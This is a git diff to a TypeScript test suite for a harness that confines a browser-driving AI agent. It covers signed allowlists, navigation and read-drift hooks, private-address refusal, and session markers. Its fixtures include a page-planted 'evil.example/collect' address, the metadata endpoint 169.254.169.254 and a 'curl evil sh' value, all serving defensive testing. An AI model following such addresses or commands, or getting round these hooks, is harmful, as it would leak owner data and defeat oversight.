@@ -12,7 +12,7 @@ import {
   attributesGood, checkFacts, confirmGate, confirmWhy, jobClaimFor, jobFromAsk, jobText, keyFingerprint, makeJobToken, normalUrl, onLogin,
   onPin, onRedirect, parseAllowlist, parseDate, parseHeartbeat, parseJob, parseKeys, parseResult, readJobToken, sanitizeUrl, seenHash, signAllowlist,
   signerOf, stateAfter, QUEUE_ATTRIBUTES,
-  addressCtxFor, PLANS, resultLines, reportValues, carriesReport, riskyEntry,
+  addressCtxFor, PLANS, resultLines, reportValues, carriesReport, riskyEntry, unapprovedValues,
   type Allow, type Job, type Result,
 } from "../rootfs/opt/cain/pcjobs/core.ts";
 import { heartbeatLine, heartbeatNotice, readHeartbeat, readJobs, readResult, round, type Config } from "../rootfs/opt/cain/pcjobs/main.ts";
@@ -34,6 +34,8 @@ import {
   addressScope, ipKind, scopeOf, resolvedKind, scopeFromEnv, REFUSED_SCHEMES, QUERY_MAX, entryDomains, inventoryConfirmed, markingGate, hookAddresses, ADDRESS_CASES,
   containmentProblem, ensureJobHelper, jobObjectCheck, parseHolders, cleanupHint, CLEANUP_HINT, shortAnswer, shortNameSetting, contextStreaks, CONTEXT_TOOL,
   judgeChore, CHORE_TABS, PROBE_TRIP_RATE_MAX, runSession, sessionCode, SELFTEST_SESSION,
+  readGuardMain, readDecide, responseText, WORKER_CODE, pslText, PSL_SHA256, PSL_FILE, READ_DRIFT_MESSAGE, READ_MATCHER, READ_GUARD_COMMAND, inventoryState, NOT_READY_MESSAGE, clearMarkers, markerPath, hostScope, onCanary,
+  jobHelperState, cscCandidates, systemRoot, readStamp, JOB_HELPER_SOURCE, KILL_INTERMEDIARY, blocker, hostAllowed, jobScopeProblem, queryAllowed, entryRegistrable,
   type Install, type Instruction, type Opts, type Session, type Gate,
 } from "../rootfs/opt/cain/pcjobs/worker.ts";
 import { spendNonce } from "../rootfs/opt/cain/pcjobs/confirm.ts";
@@ -60,13 +62,13 @@ const NONCE = "n0nce-n0nce-n0nce-n0nce-1";
 
 const READ = { site: "example.com", action: "read_account_settings", step: "read",
   start_url: "https://example.com/account/settings", done_looks_like: "The settings page is open and its state is reported" };
-const PIN: Allow = { site: "example.com", action: "read_account_settings", url: "https://example.com/account", match: "prefix" };
+const PIN: Allow = { site: "example.com", action: "read_account_settings", url: "https://example.com/account", match: "prefix", domains: ["example.com"] };
 const SEEN = { account: "d***@***.com", confirm_url: "https://example.com/account/delete/confirm", prompt_sha256: "a".repeat(64) };
 
 function job(over: Partial<Job> = {}): Job {
   return { v: 1, id: "j-20261115-abc123", from: "cain", created: T0.toISOString(), expires: mins(24 * 60).toISOString(),
     state: "pending", lease_until: null, attempt: null, ...READ, step: "read", follows: null, preview_seen: null, owner_go: null,
-    go_token: null, ...over } as Job;
+    go_token: null, owner_reuse: null, ...over } as Job;
 }
 const preview = (over: Partial<Job> = {}) => job({ id: "j-20261115-prev01", action: "delete_account", step: "preview",
   start_url: "https://example.com/account/delete", state: "awaiting_owner", attempt: "a-0123456789", ...over });
@@ -277,7 +279,7 @@ describe("the owner's allowlist", () => {
   });
   test("an entry may allow bounded redirects: path prefixes on its own host, signed with the rest", () => {
     const keys = parseKeys(OWNER_PUB);
-    const e = { site: "example.com", action: "read_account_settings", url: "https://example.com/settings", match: "exact", redirects: ["/account/security/", "/settings/home"] };
+    const e = { site: "example.com", action: "read_account_settings", url: "https://example.com/settings", match: "exact", redirects: ["/account/security/", "/settings/home"], domains: ["example.com"] };
     const a = parseAllowlist(signAllowlist("owner-1", [e as Allow], ownerSign), keys);
     expect(a.ok && a.value[0].redirects).toEqual(["/account/security/", "/settings/home"]);
     // Tampering with the redirects breaks the signature.
@@ -298,7 +300,8 @@ describe("the owner's allowlist", () => {
   });
 
   test("sign-in hosts and paths are part of the signed entry, and so is allowing alternatives", () => {
-    const e: Allow = { ...PIN, login_hosts: ["accounts.example.com", ".id.example.org"], login_paths: ["/login", "/signin*"] };
+    const e: Allow = { ...PIN, login_hosts: ["accounts.example.com", ".id.example.org"], login_paths: ["/login", "/signin*"],
+      domains: ["example.com", "accounts.example.com", "id.example.org", "*.id.example.org"] };
     const t = signAllowlist("owner-1", [e], ownerSign);
     expect(parseAllowlist(t, keys).ok).toBe(true);
     const re = JSON.parse(t);
@@ -365,7 +368,14 @@ const CH = "mcp__claude-in-chrome__";
 const SID = "sess-standin-0001";
 // A marker file saying SID's inventory passed, as the worker's gate writes it: the hook's
 // inventory barrier refuses every call without one.
-function markerFor(dir: string, sid = SID): string { const f = join(dir, `inventory-${sid}`); writeFileSync(f, `${sid}\n`); return f; }
+// The session's nonce in these tests, and the marker the gate writes for a session that passed: inventory/<id>, holding the id and the nonce.
+const TNONCE = "0123456789abcdef0123456789abcdef";
+function writeMarker(env: Record<string, string | undefined>, sid = SID) { mkdirSync(env.PCW_INVENTORY_DIR!, { recursive: true }); writeFileSync(join(env.PCW_INVENTORY_DIR!, sid), `${sid} ${env.PCW_RUN_NONCE}\n`); }
+function markerEnv(dir: string, sid = SID): { PCW_INVENTORY_DIR: string; PCW_RUN_NONCE: string } {
+  const env = { PCW_INVENTORY_DIR: join(dir, "inventory"), PCW_RUN_NONCE: TNONCE };
+  writeMarker(env, sid);
+  return env;
+}
 // The Claude in Chrome tools a session is given: the four reading tools and the two that navigate.
 const GIVEN = ["tabs_context_mcp", "read_page", "get_page_text", "find", "navigate", "tabs_create_mcp"].map((t) => CH + t);
 const ev = {
@@ -439,8 +449,8 @@ function queueRig(o: { attributes?: string | false; confirmed?: boolean } = {}) 
   const allow = (entries: Allow[]) => fileOk(join(home, "allowlist.json"), signAllowlist("owner-1", entries, ownerSign));
   fileOk(join(home, "owner.pub"), `${OWNER_PUB}\n`);
   fileOk(join(home, "ship.pub"), `link-1 ${LINK_PUB}\n`);
-  allow([{ ...PIN, login_hosts: ["accounts.example.com"], login_paths: ["/login", "/signin*"] },
-    { site: "example.com", action: "read_account_settings", url: "https://example.com/account/settings", match: "exact" }]);
+  allow([{ ...PIN, login_hosts: ["accounts.example.com"], login_paths: ["/login", "/signin*"], domains: ["example.com", "accounts.example.com"] },
+    { site: "example.com", action: "read_account_settings", url: "https://example.com/account/settings", match: "exact", domains: ["example.com"] }]);
   // The dedicated profile, as Chrome leaves it on disk, and Chrome running on it.
   const udd = join(home, "chrome");
   mkdirSync(join(udd, "Default", "Extensions", EXT, "1.2.3_0"), { recursive: true });
@@ -597,6 +607,12 @@ function queueRig(o: { attributes?: string | false; confirmed?: boolean } = {}) 
           text = readsUrl ? `Title: t\nURL: ${t?.url ?? ""}\n\nPage text.` : "Title: t\n\nPage text.";
           const later = t ? pending.get(t.id) : undefined;
           if (t && later) await visit(t, later);
+          // The read-time drift check (PostToolUse), as Claude Code runs it: its block replaces the answer.
+          if (hookRuns && !env.PCW_HOOK_STALL_MS && env.PCW_TEST_OPEN !== "1") {
+            let said = "";
+            await readGuardMain(env, async () => JSON.stringify({ session_id: SID, tool_use_id: id, tool_name: name, tool_input: input, tool_response: [{ type: "text", text }] }), (x) => { said += x; });
+            if (said) { try { text = JSON.parse(said).hookSpecificOutput.updatedMCPToolOutput; } catch { /* left as is */ } }
+          }
         }
         events.push(ev.res(id, false, text));
         return { id, ok: true, text };
@@ -776,7 +792,7 @@ const configLeft = (dir: string) => (existsSync(dir) ? readdirSync(dir) : []).fi
 const ACCEPT = { acceptBoundary: true };
 // The probe's process-end check, as a healthy PC answers it.
 const PROCESS_OK = { platform: "win32", tree_kill: { passed: true, left: 0, polls: 1 }, signals: [{ signal: "SIGINT", handler_ran: false, passed: false }],
-  job_object: { helper: true, descendant_started: true, descendant_left: false, passed: true } };
+  job_object: { helper: true, descendant_started: true, descendant_left: false, kill_tree_gone: true, passed: true } };
 
 describe("Cain's keeper", () => {
   test("writes a good job, with the queue's .gitattributes, and refuses malformed ones", () => {
@@ -873,11 +889,11 @@ describe("the PC worker: one run", () => {
     expect(env.DISABLE_AUTOUPDATER).toBe("1");
     // An allowlisted environment: nothing of the worker's own but what is listed, forward
     // slashes in what the hook command expands, and the hook's own log for this session.
-    expect(Object.keys(env).sort()).toEqual(["CLAUDE_CONFIG_DIR", "DISABLE_AUTOUPDATER", "HOME", "PATH", "PCW_DENY_PATHS", "PCW_DENY_TOKENS", "PCW_HOOK_KEY_FILE", "PCW_INVENTORY_MARKER", "PCW_NAV_ALLOW", "PCW_NAV_CANARY", "PCW_NAV_DOMAINS", "PCW_NAV_LOG", "PCW_NAV_QUERY", "PCW_RESOLVE", "PCW_RUNTIME", "PCW_WORKER", "SystemRoot", "TEMP"]);
-    // The run's navigation scope: the entry's registrable domains, its check page's exact origin, no query.
+    expect(Object.keys(env).sort()).toEqual(["CLAUDE_CONFIG_DIR", "DISABLE_AUTOUPDATER", "HOME", "PATH", "PCW_DENY_PATHS", "PCW_DENY_TOKENS", "PCW_HOOK_KEY_FILE", "PCW_INVENTORY_DIR", "PCW_NAV_ALLOW", "PCW_NAV_CANARY", "PCW_NAV_DOMAINS", "PCW_NAV_LOG", "PCW_NAV_QUERY", "PCW_RESOLVE", "PCW_RUNTIME", "PCW_RUN_NONCE", "PCW_WORKER", "SystemRoot", "TEMP"]);
+    // The run's navigation scope: the entry's own domain patterns, its check page by scheme, address, port and path, no query.
     expect(JSON.parse(env.PCW_NAV_DOMAINS)).toEqual(["example.com"]);
-    expect(JSON.parse(env.PCW_NAV_CANARY)).toEqual([expect.stringMatching(/^http:\/\/127\.0\.0\.1:\d+$/)]);
-    expect(env.PCW_NAV_QUERY).toBe("0");
+    expect(JSON.parse(env.PCW_NAV_CANARY)).toEqual([expect.stringMatching(/^http:\/\/127\.0\.0\.1:\d+\/pcw\/[0-9a-f]+$/)]);
+    expect(JSON.parse(env.PCW_NAV_QUERY)).toEqual([]);
     // The CLI's own config folder: the worker's own, under the worker folder, signed in once at setup.
     expect(env.CLAUDE_CONFIG_DIR).toBe(join(q.home, "claude-config"));
     // It stays (its sign-in persists); nothing a session left there does.
@@ -1276,7 +1292,8 @@ describe("the PC worker: what the model saw", () => {
   test("addresses: where the tab ended off the pin is unexpected_location (path case and a query included); a sign-in host or path is needs_login", async () => {
     const cases: [string, string, string | null][] = [
       ["https://example.com/billing", "unexpected_location", null],
-      ["https://evil.example.net/account", "unexpected_location", null],
+      // Read there first: the read-time check refuses the page before the end check sees where it ended.
+      ["https://evil.example.net/account", "read_drift", null],
       ["https://example.com/ACCOUNT/settings/", "unexpected_location", null],
       ["https://example.com/account/settings?view=unsubscribe", "unexpected_location", null],
       ["https://example.com/account/settings/", "ok", "https://example.com/account/settings/"],
@@ -1394,7 +1411,7 @@ describe("the PC worker: what the model saw", () => {
   test("the hook fails closed: an error, input it can't read, no answer in time, or a log it can't write is a deny, with exit 2 and a deny decision", async () => {
     const dir = mkdtempSync(join(tmpdir(), "pchook-"));
     const log = join(dir, "nav.jsonl");
-    const env = { PCW_NAV_ALLOW: JSON.stringify(["https://example.com/account/settings"]), PCW_NAV_LOG: log, PCW_HOOK_MS: "200", PCW_INVENTORY_MARKER: markerFor(dir) };
+    const env = { PCW_NAV_ALLOW: JSON.stringify(["https://example.com/account/settings"]), PCW_NAV_LOG: log, PCW_HOOK_MS: "200", ...markerEnv(dir) };
     const good = JSON.stringify({ session_id: SID, tool_use_id: "toolu_7", tool_name: `${CH}navigate`, tool_input: { url: "https://example.com/account/settings" } });
     const runHook = async (e: Record<string, string>, read: () => Promise<string>, decide?: typeof navDecide) => {
       let out = "", err = "";
@@ -1422,7 +1439,7 @@ describe("the PC worker: what the model saw", () => {
     // An allow it can't log (the log is a folder) is a deny; so is no log at all.
     mkdirSync(join(dir, "folder"));
     denied(await runHook({ ...env, PCW_NAV_LOG: join(dir, "folder") }, async () => good), "log_failed");
-    denied(await runHook({ PCW_NAV_ALLOW: env.PCW_NAV_ALLOW, PCW_INVENTORY_MARKER: env.PCW_INVENTORY_MARKER }, async () => good), "log_failed");
+    denied(await runHook({ PCW_NAV_ALLOW: env.PCW_NAV_ALLOW, PCW_INVENTORY_DIR: env.PCW_INVENTORY_DIR, PCW_RUN_NONCE: env.PCW_RUN_NONCE }, async () => good), "log_failed");
     // Every deny is logged too, where it can be.
     const read = JSON.stringify({ session_id: SID, tool_use_id: "toolu_9", tool_name: `${CH}get_page_text`, tool_input: {} });
     expect(await runHook(env, async () => read)).toEqual({ code: 0, out: "", err: "" });
@@ -1435,13 +1452,13 @@ describe("the PC worker: what the model saw", () => {
       ev.use("toolu_2", `${CH}read_page`, {}), ev.res("toolu_2", false, "ok")]));
     // Any tool use with no logged decision for its id went past the hook: hook_missing_decision, whatever else happened.
     const readAllow = { id: "toolu_2", tool: "read_page", url: null, decision: "allow" as const, why: "reads" };
-    expect(guardCheck(st, [])).toEqual({ code: "hook_missing_decision", missing: ["toolu_1", "toolu_2"], unguarded: [], denied: [], walled: [], context_refusals: [] });
+    expect(guardCheck(st, [])).toEqual({ code: "hook_missing_decision", missing: ["toolu_1", "toolu_2"], unguarded: [], denied: [], walled: [], context_refusals: [], retried: [], drifted: [] });
     expect(guardCheck(st, [{ id: "toolu_1", tool: "navigate", url: "https://a.example/x", decision: "allow", why: "run_address" }]))
-      .toEqual({ code: "hook_missing_decision", missing: ["toolu_2"], unguarded: [], denied: [], walled: [], context_refusals: [] });
+      .toEqual({ code: "hook_missing_decision", missing: ["toolu_2"], unguarded: [], denied: [], walled: [], context_refusals: [], retried: [], drifted: [] });
     expect(guardCheck(st, [{ id: "toolu_1", tool: "navigate", url: "https://a.example/other", decision: "allow", why: "run_address" }, readAllow]).code).toBe("navigation_unguarded");
     expect(guardCheck(st, [{ id: "toolu_1", tool: "navigate", url: "https://a.example/x", decision: "allow", why: "run_address" }, readAllow]).code).toBeNull();
     expect(guardCheck(st, [{ id: "toolu_1", tool: "navigate", url: "https://a.example/x", decision: "allow", why: "run_address" },
-      { id: "toolu_2", tool: "read_page", url: null, decision: "deny", why: "tool_not_allowed" }])).toEqual({ code: "navigation_denied", missing: [], unguarded: [], denied: ["toolu_2"], walled: [], context_refusals: [] });
+      { id: "toolu_2", tool: "read_page", url: null, decision: "deny", why: "tool_not_allowed" }])).toEqual({ code: "navigation_denied", missing: [], unguarded: [], denied: ["toolu_2"], walled: [], context_refusals: [], retried: [], drifted: [] });
     // A built-in tool in the stream, with no decision: the hook didn't see it.
     const builtin = parseStream(stream([ev.init([]), ev.use("toolu_4", "Bash", { command: "ls" }), ev.res("toolu_4", true, "denied")]));
     expect(guardCheck(builtin, []).code).toBe("hook_missing_decision");
@@ -1525,7 +1542,7 @@ describe("where a run ends, and its tabs", () => {
       ["https://example.com/elsewhere", "unexpected_location", null],
     ] as const) {
       const { q, id } = oneJob();
-      q.allow([{ site: "example.com", action: "read_account_settings", url: "https://example.com/account/settings", match: "exact", redirects: ["/account/security/"] }]);
+      q.allow([{ site: "example.com", action: "read_account_settings", url: "https://example.com/account/settings", match: "exact", redirects: ["/account/security/"], domains: ["example.com"] }]);
       q.say((_i, canary) => ({ canary, outcome: "seen", final_url: land, facts: {} }));
       expect(await run(q.opts(attended))).toMatchObject({ code, job: id });
       expect(result(q, id)).toMatchObject({ code, final_url: kept });
@@ -1824,7 +1841,7 @@ describe("the supervised probe and confirm-profile", () => {
     const before = sh(["git", "rev-parse", "main"], q.remote);
     let target = "";
     q.say((ins, canary) => { target = ins.start_url; return { canary, outcome: "needs_login", final_url: "https://example.com/login" }; });
-    q.allow([{ ...PIN, login_paths: ["/login"] }, { site: "example.com", action: "read_account_settings", url: "https://example.com/settings", match: "exact", login_paths: ["/login"] }]);
+    q.allow([{ ...PIN, login_paths: ["/login"] }, { site: "example.com", action: "read_account_settings", url: "https://example.com/settings", match: "exact", login_paths: ["/login"], domains: ["example.com"] }]);
     const ev = await probe(q.opts(attended));
     expect(target).toBe("https://example.com/settings");
     expect(ev).toMatchObject({ stop_ok: true, smoke: "connected", failed_preflight: "extension_entry_missing", signin: { sessions: 2, signed_in: true, credential_kept: true, passed: true }, browser: "needs_login", canary_ok: true,
@@ -1838,7 +1855,8 @@ describe("the supervised probe and confirm-profile", () => {
     expect(ev.chore).toEqual({ tabs: 3, reads: 6, refusals: 0, longest: 0, rate_per_read: 0, passed: true });
     expect(ev.addresses.passed).toBe(true);
     expect(ev.addresses.cases.map((c: any) => [c.kind, c.why])).toEqual([["file", "scheme_not_allowed"], ["localhost", "private_address"],
-      ["loopback_other_port", "private_address"], ["private_network", "private_address"]]);
+      ["loopback_other_port", "private_address"], ["private_network", "private_address"], ["decimal_ip", "private_address"], ["hex_ip", "private_address"],
+      ["mapped_ipv6", "private_address"], ["trailing_dot", "trailing_dot"]]);
     expect(ev.init_order.init_first).toBe(true);
     // On Windows the probe reads the real volume's setting (fsutil 8dot3name query); elsewhere there is none.
     if (WIN) expect(ev.short_names).toMatchObject({ volume: expect.stringMatching(/^[A-Z]:$/) });
@@ -1965,7 +1983,7 @@ describe("the supervised probe and confirm-profile", () => {
     // barrier would end a session given Bash at its init event; these cases stand in a session whose
     // barrier passed anyway, so the deny check's own classification is what they exercise.)
     const pastBarrier = (q: ReturnType<typeof queueRig>): Opts["launch"] => (argv, cwd, ms, env, stop, gate) =>
-      q.opts().launch!(argv, cwd, ms, env, stop, (init) => { gate?.(init); writeFileSync(env.PCW_INVENTORY_MARKER, `${SID}\n`); return true; });
+      q.opts().launch!(argv, cwd, ms, env, stop, (init) => { gate?.(init); writeMarker(env); return true; });
     const q = queueRig({ confirmed: false });
     q.tools((p) => [...GIVEN, ...(p.includes("permission check") ? ["Bash"] : [])]);
     q.denyExtra(async () => [ev.use("b1", "Bash", { command: "echo" }), ev.res("b1", true, "Permission denied"), ev.result("done", [{ tool: "Bash", id: "b1" }])]);
@@ -2055,7 +2073,7 @@ describe("fifth review: addresses midway, the environment, the hook in Git Bash,
       const { q, id } = oneJob();
       q.runExtra(async (b) => {
         const t = b.group.find((x) => x.url.startsWith("https://"))!;
-        t.url = "https://evil.example/collect";
+        t.url = "https://example.com/collect";
         await b.use("get_page_text", { tabId: t.id });
         t.url = back;
       });
@@ -2065,7 +2083,20 @@ describe("fifth review: addresses midway, the environment, the hook in Git Bash,
       // Only the owner's trouble log, when he turns it on, says where: the end alone would have passed.
       const diag = readFileSync(join(q.home, "diagnostics.log"), "utf8");
       expect(diag).toContain(`final_url=${back}`);
-      expect(diag).toContain("off_url=https://evil.example/collect off_kind=reading_tool");
+      expect(diag).toContain("off_url=https://example.com/collect off_kind=reading_tool");
+    }
+    // Off the job's domains, the read itself is refused as it happens (read_drift), before the end check: its log keeps the domain and a keyed hash.
+    {
+      const { q, id } = oneJob();
+      q.runExtra(async (b) => {
+        const t = b.group.find((x) => x.url.startsWith("https://"))!;
+        t.url = "https://evil.example/collect";
+        await b.use("get_page_text", { tabId: t.id });
+        t.url = back;
+      });
+      expect(await run(q.opts({ ...attended, diagnose: true }))).toMatchObject({ code: "read_drift", job: id, state: "failed" });
+      expect(result(q, id)).toMatchObject({ status: "failed", code: "read_drift", final_url: null, facts: {} });
+      expect(readNavLog(join(q.home, "nav-decisions.jsonl")).find((d) => d.why === "read_drift")).toMatchObject({ domain: "evil.example", url: null });
     }
     // Seen in a tab context; on the job's site but off the pin, its address is kept (scheme, host and path).
     {
@@ -2189,7 +2220,7 @@ describe("fifth review: addresses midway, the environment, the hook in Git Bash,
     const o: Opts = { home, env: process.env, resolveHosts: false };
     const env = sessionEnv(o, ["https://example.com/account/settings", END_URL]);
     expect(env.PCW_WORKER).toBe(WORKER_FILE.replace(/\\/g, "/"));
-    writeFileSync(env.PCW_INVENTORY_MARKER, `${SID}\n`);
+    writeMarker(env);
     const hook = (input: string) => spawnSync(bash!, ["-c", HOOK_COMMAND], { input, env, encoding: "utf8", timeout: 90_000 });
     const payload = (id: string, url: string) => JSON.stringify({ session_id: SID, hook_event_name: "PreToolUse", tool_use_id: id,
       tool_name: `${CH}navigate`, tool_input: { url, tabId: 5 } });
@@ -2670,7 +2701,7 @@ describe("seventh review: the deny-alone check gates confirmation, address facts
 
   test("address facts: exactly one of the run's approved addresses, or an approved host with the action's own path words; nothing free-form", () => {
     const pin: Allow = { site: "example.com", action: "read_account_settings", url: "https://example.com/account/settings", match: "exact",
-      login_hosts: ["accounts.example.com", ".id.example.org"], login_paths: ["/login"], redirects: ["/account/security/"] };
+      login_hosts: ["accounts.example.com", ".id.example.org"], login_paths: ["/login"], redirects: ["/account/security/"], domains: ["example.com", "accounts.example.com", "id.example.org", "*.id.example.org"] };
     const ctx = addressCtxFor(pin);
     const fact = (url: unknown, c = ctx) => checkFacts("delete_account", { confirm_url: url }, c);
     for (const ok of ["https://example.com/account/settings", "https://example.com/login", "https://accounts.example.com/any/path/at_all",
@@ -2858,7 +2889,7 @@ describe("seventh review: the deny-alone check gates confirmation, address facts
     const keyDir = join(q.root, "owner-key");
     const pub = ownerKeygen("owner-9", keyDir, "a long test passphrase");
     const key = join(keyDir, "owner-key.pem");
-    const base = { site: "example.com", action: "read_account_settings", match: "exact" };
+    const base = { site: "example.com", action: "read_account_settings", match: "exact", domains: ["example.com"] };
     const sign = (entries: unknown[]) => signAllowlistFile(q.write("entries.json", entries), key, "a long test passphrase", "owner-9");
     expect(sign([{ ...base, url: "https://example.com/account/settings" }])).toContain("example.com/account/settings");
     for (const [url, extra] of [["https://example.com/account/logout", {}], ["https://example.com/account/sign-out", {}], ["https://example.com/email/unsubscribe", {}],
@@ -3093,7 +3124,7 @@ describe("eighth review: the stated boundary, the canary from the server's recor
     // The signing tool.
     const keyDir = join(q.root, "owner-key");
     ownerKeygen("owner-9", keyDir, "a long test passphrase");
-    const base = { site: "example.com", action: "read_account_settings", match: "exact" };
+    const base = { site: "example.com", action: "read_account_settings", match: "exact", domains: ["example.com"] };
     const sign = (entries: unknown[]) => { try { signAllowlistFile(q.write("entries.json", entries), join(keyDir, "owner-key.pem"), "a long test passphrase", "owner-9"); return null; } catch (e) { return e as any; } };
     expect(sign([{ ...base, url: "https://example.com/account/delete" }])?.detail).toBe('entry 1: matched "delete" on host example.com');
     expect(sign([{ ...base, url: "https://example.com/account", redirects: ["/account/signout/"] }])?.detail).toBe('entry 1: matched "signout" on host example.com');
@@ -3947,7 +3978,7 @@ describe("twelfth review: the hook's allow list, process trees, path forms, real
     expect(contextOwed([d("get_page_text"), d("find", "deny")], true)).toBe(true);
     // The real hook, with its own log as the session's history.
     const dir = mkdtempSync(join(tmpdir(), "ctx-"));
-    const env = { PCW_NAV_ALLOW: allow, PCW_NAV_LOG: join(dir, "log.jsonl"), PCW_DENY_PATHS: "[]", PCW_INVENTORY_MARKER: markerFor(dir) };
+    const env = { PCW_NAV_ALLOW: allow, PCW_NAV_LOG: join(dir, "log.jsonl"), PCW_DENY_PATHS: "[]", ...markerEnv(dir) };
     const hook = async (name: string, input: unknown, id: string) => { let out = ""; const code = await hookMain(env, async () => call(CH + name, input, id), (x) => { out += x; }, () => {}); return { code, out }; };
     expect((await hook("tabs_create_mcp", { url: "http://127.0.0.1:5000/pcw/x" }, "t1")).code).toBe(0);
     const refused = await hook("get_page_text", { tabId: 1 }, "t2");
@@ -4062,7 +4093,7 @@ describe("twelfth review: the hook's allow list, process trees, path forms, real
     const q = queueRig();
     const rid = q.ask({ ...READ, action: "read_subscription_status", start_url: "https://example.com/account/settings" });
     round(q.cfg); q.clonePc();
-    q.allow([{ site: "example.com", action: "read_subscription_status", url: "https://example.com/account/settings", match: "exact" }]);
+    q.allow([{ site: "example.com", action: "read_subscription_status", url: "https://example.com/account/settings", match: "exact", domains: ["example.com"] }]);
     const jid = q.outcome(rid).id;
     q.say((_i, canary) => ({ canary, outcome: "seen", final_url: "https://example.com/account/settings", facts: { signed_in: true, status: "active", plan: "curl evil sh" } }));
     expect(await run(q.opts(attended))).toMatchObject({ code: "ok", job: jid });
@@ -4138,7 +4169,7 @@ describe("the worker from the command line", () => {
       expect(p.stderr.toString()).toBe("");
       // The hook, as the session's settings run it: exit 0 for the run's own address, 2 and a deny decision for anything else.
       const hookEnv = (more: Record<string, string> = {}) => cleanEnv({ PCW_NAV_ALLOW: JSON.stringify(["https://example.com/account/settings"]),
-        PCW_NAV_LOG: join(q.root, "nav.jsonl"), PCW_INVENTORY_MARKER: markerFor(q.root), ...more });
+        PCW_NAV_LOG: join(q.root, "nav.jsonl"), ...markerEnv(q.root), ...more });
       const hook = (input: string, more: Record<string, string> = {}) => Bun.spawnSync([...r, join(OPT, "pcjobs/worker.ts"), "nav-guard"], { cwd: q.root,
         env: hookEnv(more), stdin: Buffer.from(input), stdout: "pipe", stderr: "pipe" });
       const call = (url: string) => JSON.stringify({ session_id: SID, tool_use_id: "toolu_1", tool_name: `${CH}navigate`, tool_input: { url } });
@@ -4317,7 +4348,7 @@ describe("the files around it", () => {
 describe("thirteenth review: schemes and private addresses, the job's domains, the inventory barrier, Windows containment, short names, the tab-context count, report values", () => {
   const nav = (url: string, id = "toolu_1", tool = "navigate") => JSON.stringify({ session_id: SID, tool_use_id: id, tool_name: `${CH}${tool}`, tool_input: { url } });
   const CANARY = "http://127.0.0.1:5000";
-  const scope = { domains: ["example.com"], canary: [CANARY], query: false };
+  const scope = { domains: ["example.com"], canary: [CANARY], query: [] as string[] };
 
   test("a scheme allow list: only http and https open; every other scheme is refused by scheme, before any path check, even listed as allowed", () => {
     const cases: Record<string, string> = {
@@ -4340,7 +4371,9 @@ describe("thirteenth review: schemes and private addresses, the job's domains, t
     expect(addressScope("about:blank?x", scope)).toBe("scheme_not_allowed");
     // http and https on an allowed domain pass the scope (the exact list decides after).
     expect(addressScope("https://example.com/account/settings", scope)).toBeNull();
-    expect(addressScope("http://www.example.com/x", scope)).toBeNull();
+    // Exact hosts: www is another host unless the entry names it, or a wildcard it chose.
+    expect(addressScope("http://www.example.com/x", scope)).toBe("domain_not_allowed");
+    expect(addressScope("http://www.example.com/x", { ...scope, domains: ["example.com", "*.example.com"] })).toBeNull();
     expect(addressScope("https://user:pw@example.com/x", scope)).toBe("bad_address");
     expect(addressScope("not an address", scope)).toBe("bad_address");
   });
@@ -4350,9 +4383,9 @@ describe("thirteenth review: schemes and private addresses, the job's domains, t
       "http://192.168.1.1/", "http://169.254.169.254/latest/meta-data", "http://100.64.0.1/", "http://0.0.0.0/", "http://[::1]/", "http://[fe80::1]/", "http://[fc00::1]/",
       "http://[::ffff:127.0.0.1]/", "http://[::ffff:10.0.0.1]/", "http://[64:ff9b::7f00:1]/", "http://localhost/", "http://LOCALHOST:5000/pcw", "http://app.localhost/", "http://224.0.0.1/"])
       expect([url, addressScope(url, scope)]).toEqual([url, "private_address"]);
-    // A public IP literal has no registrable domain: not on the job's domains.
-    expect(addressScope("http://93.184.216.34/", scope)).toBe("domain_not_allowed");
-    expect(addressScope("http://[2606:4700::1]/", scope)).toBe("domain_not_allowed");
+    // A public IP literal is refused too: every IP-literal host is, but the check page.
+    expect(addressScope("http://93.184.216.34/", scope)).toBe("ip_address");
+    expect(addressScope("http://[2606:4700::1]/", scope)).toBe("ip_address");
     // The check page: its exact origin only; the same host on another port is refused.
     expect(addressScope(`${CANARY}/pcw/abc`, scope)).toBeNull();
     expect(addressScope("http://127.0.0.1:5001/pcw/abc", scope)).toBe("private_address");
@@ -4370,7 +4403,7 @@ describe("thirteenth review: schemes and private addresses, the job's domains, t
     // Through the hook itself (PCW_RESOLVE on): a private answer refuses the navigation before it runs.
     const dir = mkdtempSync(join(tmpdir(), "pcresolve-"));
     const env = { PCW_NAV_ALLOW: JSON.stringify(["https://example.com/account/settings"]), PCW_NAV_LOG: join(dir, "log.jsonl"), PCW_NAV_DOMAINS: '["example.com"]',
-      PCW_RESOLVE: "1", PCW_INVENTORY_MARKER: markerFor(dir) };
+      PCW_RESOLVE: "1", ...markerEnv(dir) };
     const hook = async (r: (h: string) => Promise<string[]>, id: string) => { let out = ""; const code = await hookMain(env, async () => nav("https://example.com/account/settings", id), (x) => { out += x; }, () => {}, undefined, r); return { code, out }; };
     expect((await hook(priv, "r1")).code).toBe(2);
     expect((await hook(pub, "r2")).code).toBe(0);
@@ -4392,39 +4425,139 @@ describe("thirteenth review: schemes and private addresses, the job's domains, t
     expect(ADDRESS_CASES.map((c) => c.kind)).toEqual(expect.arrayContaining(["file", "localhost"]));
   });
 
-  test("navigation is bound to the job's registrable domains: the entry declares them, and a page-planted address on another domain, with content in its query, is refused before the call", async () => {
-    // The entry's domains: declared, or its site's and its sign-in hosts'.
-    expect(entryDomains({ site: "example.com", action: "read_account_settings", url: "https://example.com/a", match: "exact" })).toEqual(["example.com"]);
-    expect(entryDomains({ site: "example.com", action: "read_account_settings", url: "https://example.com/a", match: "exact", login_hosts: [".accounts.example.net"] }))
-      .toEqual(["example.com", "example.net"]);
-    expect(entryDomains({ site: "example.com", action: "read_account_settings", url: "https://example.com/a", match: "exact", domains: ["example.com", "examplecdn.com"] }))
-      .toEqual(["example.com", "examplecdn.com"]);
-    // Signing refuses declared domains that leave out the site's or a sign-in host's, or aren't registrable domains; and a query entry needs review.
+  test("domains are mandatory and pinned: an entry without them is refused at signing and at preflight, the run's domains come from the signed entry alone, and a job naming another host is refused before any session", async () => {
     const keys = new Map([["owner-1", OWNER.publicKey]]);
     const signed = (allow: any[]) => parseAllowlist(signAllowlist("owner-1", allow as Allow[], ownerSign), keys);
     const base = { site: "example.com", action: "read_account_settings", url: "https://example.com/a", match: "exact" };
+    // An entry with no domains: refused when parsed (the preflight's load), with a message saying what to add.
+    const none = signed([base]);
+    expect(none.ok).toBe(false);
+    expect(!none.ok && none.why).toMatch(/names its domains/);
+    expect(signed([{ ...base, domains: [] }]).ok).toBe(false);
     expect(signed([{ ...base, domains: ["example.com"] }]).ok).toBe(true);
+    // ...and by the signing tool, before anything is signed.
